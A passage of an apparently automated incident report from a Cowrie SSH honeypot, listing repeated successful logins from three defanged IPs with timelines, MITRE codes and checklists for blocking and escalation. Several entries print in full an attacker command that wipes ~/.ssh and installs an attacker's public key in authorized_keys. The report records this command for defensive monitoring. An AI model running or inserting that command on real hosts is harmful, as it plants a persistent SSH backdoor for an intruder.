| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:02:27` | `cowrie.session.connect` |
| `2026-04-07 05:02:27` | `cowrie.client.version` |
| `2026-04-07 05:02:28` | `cowrie.client.kex` |
| `2026-04-07 05:02:29` | `cowrie.login.success` |
| `2026-04-07 05:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4c02af16f75

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:06 |
| **Last Seen** | 2026-04-07 05:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:06:46` | `cowrie.session.connect` |
| `2026-04-07 05:06:46` | `cowrie.client.version` |
| `2026-04-07 05:06:46` | `cowrie.client.kex` |
| `2026-04-07 05:06:47` | `cowrie.login.success` |
| `2026-04-07 05:06:47` | `cowrie.session.params` |
| `2026-04-07 05:06:47` | `cowrie.command.input` |
| `2026-04-07 05:06:47` | `cowrie.command.failed` |
| `2026-04-07 05:06:47` | `cowrie.log.closed` |
| `2026-04-07 05:06:47` | `cowrie.session.params` |
| `2026-04-07 05:06:47` | `cowrie.command.input` |
| `2026-04-07 05:06:47` | `cowrie.session.file_download` |
| `2026-04-07 05:06:47` | `cowrie.log.closed` |
| `2026-04-07 05:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f34871c88900

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:06 |
| **Last Seen** | 2026-04-07 05:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:06:49` | `cowrie.session.connect` |
| `2026-04-07 05:06:49` | `cowrie.client.version` |
| `2026-04-07 05:06:49` | `cowrie.client.kex` |
| `2026-04-07 05:06:50` | `cowrie.login.success` |
| `2026-04-07 05:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3755b0c413d

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:08 |
| **Last Seen** | 2026-04-07 05:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:08:26` | `cowrie.session.connect` |
| `2026-04-07 05:08:26` | `cowrie.client.version` |
| `2026-04-07 05:08:26` | `cowrie.client.kex` |
| `2026-04-07 05:08:27` | `cowrie.login.success` |
| `2026-04-07 05:08:28` | `cowrie.session.params` |
| `2026-04-07 05:08:28` | `cowrie.command.input` |
| `2026-04-07 05:08:28` | `cowrie.command.failed` |
| `2026-04-07 05:08:28` | `cowrie.log.closed` |
| `2026-04-07 05:08:29` | `cowrie.session.params` |
| `2026-04-07 05:08:29` | `cowrie.command.input` |
| `2026-04-07 05:08:29` | `cowrie.session.file_download` |
| `2026-04-07 05:08:29` | `cowrie.log.closed` |
| `2026-04-07 05:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-432ef9563db3

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:08 |
| **Last Seen** | 2026-04-07 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:08:32` | `cowrie.session.connect` |
| `2026-04-07 05:08:32` | `cowrie.client.version` |
| `2026-04-07 05:08:32` | `cowrie.client.kex` |
| `2026-04-07 05:08:33` | `cowrie.login.success` |
| `2026-04-07 05:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-302d4b7d8aa3

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:09 |
| **Last Seen** | 2026-04-07 05:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:09:58` | `cowrie.session.connect` |
| `2026-04-07 05:09:58` | `cowrie.client.version` |
| `2026-04-07 05:09:58` | `cowrie.client.kex` |
| `2026-04-07 05:09:59` | `cowrie.login.success` |
| `2026-04-07 05:10:00` | `cowrie.session.params` |
| `2026-04-07 05:10:00` | `cowrie.command.input` |
| `2026-04-07 05:10:00` | `cowrie.command.failed` |
| `2026-04-07 05:10:00` | `cowrie.log.closed` |
| `2026-04-07 05:10:01` | `cowrie.session.params` |
| `2026-04-07 05:10:01` | `cowrie.command.input` |
| `2026-04-07 05:10:01` | `cowrie.session.file_download` |
| `2026-04-07 05:10:01` | `cowrie.log.closed` |
| `2026-04-07 05:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dfe0e6bcb3d

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:10 |
| **Last Seen** | 2026-04-07 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:10:04` | `cowrie.session.connect` |
| `2026-04-07 05:10:04` | `cowrie.client.version` |
| `2026-04-07 05:10:04` | `cowrie.client.kex` |
| `2026-04-07 05:10:05` | `cowrie.login.success` |
| `2026-04-07 05:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-049882e0a058

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:10 |
| **Last Seen** | 2026-04-07 05:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:10:23` | `cowrie.session.connect` |
| `2026-04-07 05:10:23` | `cowrie.client.version` |
| `2026-04-07 05:10:23` | `cowrie.client.kex` |
| `2026-04-07 05:10:24` | `cowrie.login.success` |
| `2026-04-07 05:10:24` | `cowrie.session.params` |
| `2026-04-07 05:10:24` | `cowrie.command.input` |
| `2026-04-07 05:10:24` | `cowrie.command.failed` |
| `2026-04-07 05:10:24` | `cowrie.log.closed` |
| `2026-04-07 05:10:24` | `cowrie.session.params` |
| `2026-04-07 05:10:24` | `cowrie.command.input` |
| `2026-04-07 05:10:24` | `cowrie.session.file_download` |
| `2026-04-07 05:10:24` | `cowrie.log.closed` |
| `2026-04-07 05:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49eb879a725f

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:10 |
| **Last Seen** | 2026-04-07 05:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:10:26` | `cowrie.session.connect` |
| `2026-04-07 05:10:26` | `cowrie.client.version` |
| `2026-04-07 05:10:26` | `cowrie.client.kex` |
| `2026-04-07 05:10:27` | `cowrie.login.success` |
| `2026-04-07 05:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f63af0ffd078

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:10 |
| **Last Seen** | 2026-04-07 05:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:10:32` | `cowrie.session.connect` |
| `2026-04-07 05:10:32` | `cowrie.client.version` |
| `2026-04-07 05:10:32` | `cowrie.client.kex` |
| `2026-04-07 05:10:33` | `cowrie.login.success` |
| `2026-04-07 05:10:33` | `cowrie.session.params` |
| `2026-04-07 05:10:33` | `cowrie.command.input` |
| `2026-04-07 05:10:33` | `cowrie.command.failed` |
| `2026-04-07 05:10:33` | `cowrie.log.closed` |
| `2026-04-07 05:10:33` | `cowrie.session.params` |
| `2026-04-07 05:10:33` | `cowrie.command.input` |
| `2026-04-07 05:10:34` | `cowrie.session.file_download` |
| `2026-04-07 05:10:34` | `cowrie.log.closed` |
| `2026-04-07 05:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e43819c1793a

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:10 |
| **Last Seen** | 2026-04-07 05:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:10:36` | `cowrie.session.connect` |
| `2026-04-07 05:10:36` | `cowrie.client.version` |
| `2026-04-07 05:10:36` | `cowrie.client.kex` |
| `2026-04-07 05:10:37` | `cowrie.login.success` |
| `2026-04-07 05:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dd6457f72bc

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:11 |
| **Last Seen** | 2026-04-07 05:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:11:26` | `cowrie.session.connect` |
| `2026-04-07 05:11:26` | `cowrie.client.version` |
| `2026-04-07 05:11:26` | `cowrie.client.kex` |
| `2026-04-07 05:11:27` | `cowrie.login.success` |
| `2026-04-07 05:11:28` | `cowrie.session.params` |
| `2026-04-07 05:11:28` | `cowrie.command.input` |
| `2026-04-07 05:11:28` | `cowrie.command.failed` |
| `2026-04-07 05:11:28` | `cowrie.log.closed` |
| `2026-04-07 05:11:28` | `cowrie.session.params` |
| `2026-04-07 05:11:28` | `cowrie.command.input` |
| `2026-04-07 05:11:29` | `cowrie.session.file_download` |
| `2026-04-07 05:11:29` | `cowrie.log.closed` |
| `2026-04-07 05:11:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9e16aa87b58

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:11 |
| **Last Seen** | 2026-04-07 05:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:11:31` | `cowrie.session.connect` |
| `2026-04-07 05:11:31` | `cowrie.client.version` |
| `2026-04-07 05:11:32` | `cowrie.client.kex` |
| `2026-04-07 05:11:33` | `cowrie.login.success` |
| `2026-04-07 05:11:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-012904debc62

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:12 |
| **Last Seen** | 2026-04-07 05:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:12:06` | `cowrie.session.connect` |
| `2026-04-07 05:12:06` | `cowrie.client.version` |
| `2026-04-07 05:12:06` | `cowrie.client.kex` |
| `2026-04-07 05:12:07` | `cowrie.login.success` |
| `2026-04-07 05:12:07` | `cowrie.session.params` |
| `2026-04-07 05:12:07` | `cowrie.command.input` |
| `2026-04-07 05:12:07` | `cowrie.command.failed` |
| `2026-04-07 05:12:07` | `cowrie.log.closed` |
| `2026-04-07 05:12:07` | `cowrie.session.params` |
| `2026-04-07 05:12:07` | `cowrie.command.input` |
| `2026-04-07 05:12:07` | `cowrie.session.file_download` |
| `2026-04-07 05:12:07` | `cowrie.log.closed` |
| `2026-04-07 05:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae6b0bf54b88

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:12 |
| **Last Seen** | 2026-04-07 05:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:12:09` | `cowrie.session.connect` |
| `2026-04-07 05:12:09` | `cowrie.client.version` |
| `2026-04-07 05:12:09` | `cowrie.client.kex` |
| `2026-04-07 05:12:10` | `cowrie.login.success` |
| `2026-04-07 05:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ac3f17b4cab

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:13 |
| **Last Seen** | 2026-04-07 05:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:13:31` | `cowrie.session.connect` |
| `2026-04-07 05:13:31` | `cowrie.client.version` |
| `2026-04-07 05:13:31` | `cowrie.client.kex` |
| `2026-04-07 05:13:32` | `cowrie.login.success` |
| `2026-04-07 05:13:32` | `cowrie.session.params` |
| `2026-04-07 05:13:32` | `cowrie.command.input` |
| `2026-04-07 05:13:32` | `cowrie.command.failed` |
| `2026-04-07 05:13:32` | `cowrie.log.closed` |
| `2026-04-07 05:13:33` | `cowrie.session.params` |
| `2026-04-07 05:13:33` | `cowrie.command.input` |
| `2026-04-07 05:13:33` | `cowrie.session.file_download` |
| `2026-04-07 05:13:33` | `cowrie.log.closed` |
| `2026-04-07 05:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cd3f689e82c

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:13 |
| **Last Seen** | 2026-04-07 05:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:13:35` | `cowrie.session.connect` |
| `2026-04-07 05:13:35` | `cowrie.client.version` |
| `2026-04-07 05:13:35` | `cowrie.client.kex` |
| `2026-04-07 05:13:36` | `cowrie.login.success` |
| `2026-04-07 05:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16c21d3fcb64

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:13 |
| **Last Seen** | 2026-04-07 05:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
